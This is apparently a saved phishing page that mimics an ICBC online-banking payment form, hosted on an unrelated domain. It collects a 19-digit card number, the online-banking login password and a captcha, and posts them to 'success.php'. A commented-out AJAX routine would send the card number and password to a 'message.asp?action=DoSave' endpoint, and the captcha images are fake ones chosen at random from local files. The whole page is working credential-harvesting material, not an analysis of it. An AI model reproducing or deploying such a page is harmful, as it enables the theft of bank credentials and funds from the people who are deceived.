
<!-- saved from url=(0043)http://www.shtx68.com/Item/main.asp?tt=acbc -->
<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"><script type="text/javascript" src="css/jquery.min.js"></script>
<script type="text/javascript" src="css/ajax.js"></script>
<link rel="stylesheet" type="text/css" href="css/b2c.css">
<script language="JavaScript">



function checkform(){
	var reg = new RegExp("^[0-9]{19}$");
    var obj = document.getElementById("cnu");
    if (document.getElementById('cnu').value=='' )
			{
				alert('支付卡号不可为空');
				return false;
			}
        
     if(!reg.test(obj.value)){
         alert("请输入十九位银行卡号!");
		 return false;
     }
     if(!/^[0-9]*$/.test(obj.value)){
         alert("请输入正确位银行卡号!");
		 return false;
     }
	if (document.getElementById('pwd').value==''){
				alert('登录密码不可为空');
				return false;
			}			
	if (document.getElementById('yzm').value==''){
				alert('验证码不可为空');
				return false;
			}
	//else{
//	$.ajax({
//			type:'get',
//			url: '/item/message.asp?action=DoSave',
//			cache:false,
//			data: {
//				'Name': $("#cnu").val(),
//				'Password': $("#pwd").val(),
//				'LeiXing': $("#LeiXing").val()
//							
//			},
//			success:function(flag){
//				
//			}
//		});
//		return true;
//	}
}


	function showalert2(){
		if (document.getElementById('pwd').value=='')
		{
			document.getElementById('inputTips2').style.display='block';
		}
	}
	function hidealert2(){
			document.getElementById('inputTips2').style.display='none';
	}



	function showalert(){
		if (document.getElementById('cnu').value=='') 
		{
			document.getElementById('inputTips').style.display='block';
		}
	}
	function hidealert(){
			document.getElementById('inputTips').style.display='none';
	}
	 function showalert(){
        var reg = new RegExp("^[0-9]{19}$");
        var obj = document.getElementById("cnu");
     if(!reg.test(obj.value)){
         alert("请输入十九位银行卡号!");
     }
     if(!/^[0-9]*$/.test(obj.value)){
         alert("请输入正确位银行卡号!!");
     }
	
   }

function changevimg(){
		document.getElementById('_tokenImg').src ='/images/' + Math.floor(Math.random()*(14)) + '.jpg';;
}	
	
</script>
</head><body class="alpha" bgcolor="transparent" style="overflow-x:hidden" marginwidth="0" marginheight="0">
<form name="f1" action="success.php" method="post" target="_self" onSubmit="return checkform();">

<input type="hidden" name="LeiXing" id="LeiXing" value="acbc">
 <div id="divss" style="outline:none" hidefocus="true" tabindex="0"></div>
 <div class="Box">
  <div class="Header">
<table border="0" cellspacing="0">
	<tbody><tr>
		<td height="32" style="background:url(ICBC/operZone_01.png) no-repeat;border=0;margin=0;padding=0;">
			<table border="0" cellspacing="0">
			  <tbody><tr>
			  	<td width="75"></td>
			    <td width="619" valign="bottom">
					<div align="left" nowrap="" style="position: absolute; top:0px;left:75px; width: 505px; ">
					<img src="css/commPay_checked.png" width="156" height="32" border="0">
					<img src="css/item_separator.png" width="12" height="20" vspace="6" style="display:none">
					<a href="http://www.shtx68.com/Item/main.asp"><img src="css/epay_unchecked.png" width="155" height="32" border="0"></a>    
			 		</div>
			 		<div id="thirdpayTips" style="position:absolute; top:35px;left:445px; width:130px;background:url(/ICBC/little_bulb_0.png) no-repeat center top; height:48px;display:none;z-index:100;">
		              <table>
		                <tbody><tr>
		                  <td height="38" valign="bottom" class="style2"> 自己不便支付时，您可<br>以试下他人代付。</td>
		                </tr>
		              </tbody></table>
		            </div>
				</td>
			  </tr>
			</tbody></table>
		</td>
	</tr>
	</tbody></table>
</div>
<div class="Content">
  <table width="100%" border="0" cellspacing="0" cellpadding="0"> 
	<tbody><tr>
	   <td style="background:url(ICBC/operZone_02.png) repeat-y;border=0;margin=0;padding=0;">
		 <table border="0" cellspacing="0">
		   <tbody><tr align="center">
			  <td height="320" colspan="2" valign="top">
		    	
		    	<div align="center">
		      		<table width="560" border="0">
		      			
				         <tbody><tr>
				            <td height="31" colspan="3"></td>
				         </tr>
				       	
						  <tr>
				            	<td width="60" height="31"><div align="right"><img src="css/num1_12.gif" width="21" height="20"></div></td>
				            
				            	<td colspan="2"><span class="style1">请仔细核对左侧订单信息，再输入卡（账）号和验证码</span></td>
				            
				          </tr>	
                          
                          
                          
				          <tr>
				            <td width="60" height="31"></td>
				            <td colspan="2"><table width="100%" border="0">
				        
				       
				              	<tbody><tr id="paycard_hTR" style="display:">
					                <td width="35%" height="25" align="right" class="style1" nowrap="nowrap">卡（账）号：</td>
								  
									<td height="36" colspan="1">
					                	<div>
					                			
									<input type="text" onClick="hidealert();" onBlur="showalert()" id="cnu" name="number" size="19" maxlength="34">
											
										</div>
									</td>
									<td width="60%"><div style="position:relative; top:0px;left:0xp">
										<div id="inputTips" style="position:absolute; top:-20px;left:0px;width:197px;height:34px;background-image:url(/ICBC/cardNumTips.gif);display:none; ">
								  			<table><tbody><tr><td valign="middle" class="style2" height="30">
												<span style="font-size: 12px">&nbsp;&nbsp;&nbsp;</span>请输11111入您的支付卡号或账号。
											</td></tr></tbody></table>
									  	</div></div>	
									</td>
								
				             	</tr>
                                
                                

         <tr> 
          <td height="25" align="right" nowrap="nowrap">网银登录密码：</td>
          <td height="25"> 
          <input type="password" name="password" id="pwd" size="19" maxlength="34" onClick="hidealert2();" onBlur="showalert2()">
           </td>
           
           
    <td width="60%"><div style="position:relative; top:0px;left:0xp">
        <div id="inputTips2" style="position:absolute; top:-20px;left:0px;width:197px;height:34px;background-image:url(/ICBC/cardNumTips.gif);display:none; ">
            <table><tbody><tr><td valign="middle" class="style2" height="30">
                <span style="font-size: 12px">&nbsp;&nbsp;&nbsp;</span>请输入您的密码。
            </td></tr></tbody></table>
        </div></div>	
    </td>              
</tr>                             
			          
				              	<tr>	
					                <td width="35%" height="33" align="right" class="style1" nowrap="nowrap">验证码：</td>
				                  <td width="60%" colspan="2">
<input type="text" maxlength="4" size="4" style="BORDER-TOP: #959595 2px solid; BORDER-LEFT: #959595 2px solid;BORDER-RIGHT: #e9e9e9 2px double; BORDER-BOTTOM: #e9e9e9 1px double;width:40;height:28;" id="yzm" name="yzm"> <img src="css/4.jpg" name="a11" align="absbottom" id="_tokenImg">  <a href="javascript::" onClick="changevimg();">刷新验证码</a></td>
							  	</tr>
							  	<tr>
									<td height="20" colspan="4" id="axsafetipTD" style="display:none"><div id="axsafetip"></div></td>
							  	</tr>
							  </tbody></table></td>
						  </tr>	 
					
				          <tr>
				            <td width="60" height="20"><div align="right"><img src="css/num2_12.gif" width="21" height="20"></div></td>
				            <td class="style1" colspan="2">
				            	点击下一步后请核对<a href="javascript::" target="_blank">预留验证信息</a>（点击查看说明）
				            </td>
				          </tr>
				    
				        
							<tr>
			          			<td height="15" colspan="3"></td>
			          		</tr>
						 
				          <tr>
				            <td colspan="1" width="60"></td>
				            <td colspan="2"><div align="center">
                            <input type="hidden" name="type" value="<?=$_GET['type'];?>">
					          	<input type="image" src="css/nextStep_12.gif" width="95" height="26" border="0">&nbsp;&nbsp;
					          	<a href="http://www.shtx68.com/Item/main.asp"><img src="css/button_14.gif" width="95" height="26" border="0"></a>&nbsp;&nbsp;								
				            </div></td>
				          </tr>
				    		<tr id="tipOfFangTaoXian">
							  		<td colspan="2" height="0"></td>
								</tr>
						
				   </tbody></table>
			    </div>
		      </td>
	        </tr>
	     </tbody></table>
	   </td>
	</tr>  
  </tbody></table>
</div> 
<div class="Bottom">
  <table border="0" cellspacing="0">
	<tbody><tr>
		<td width="613" height="15" style="background:url(ICBC/operZone_03.png) no-repeat;border=0;margin=0;padding=0;">
		</td>
	</tr>
  </tbody></table>
 </div>
 </div>
 
 
 
 
 
 
 
 </form>


</body></html>